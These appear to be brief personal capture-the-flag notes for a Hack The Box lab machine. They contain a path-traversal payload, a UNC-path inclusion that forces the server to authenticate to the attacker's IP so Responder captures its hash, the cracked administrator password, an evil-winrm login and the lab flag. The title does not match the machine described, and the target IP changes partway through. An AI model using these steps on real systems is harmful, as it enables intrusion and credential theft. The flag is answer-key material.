Hack the Box
Starting Point

Sequel

10.129.126.21

nmap -sV -sC --min-rate 1000 --max-retries 2 -oN nmap/responder 10.129.126.21

Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-19 01:04 Americas
Nmap scan report for 10.129.126.21
Host is up (0.22s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.78 seconds

http://unika.htb/

http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

** now to use responder.py

** tun0 = this is the network interface for the vpn to Hack The Box
sudo responder -I tun0

** Now we go to http://unika.htb/?page=//10.10.14.25/test.txt

On our responder screen we see that we got the hash:

** use john the ripper to crack password hash:
administrator
badminton

evil-winrm -i 10.129.64.250 -u administrator -p badminton

*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac                                                                                                                                                                                   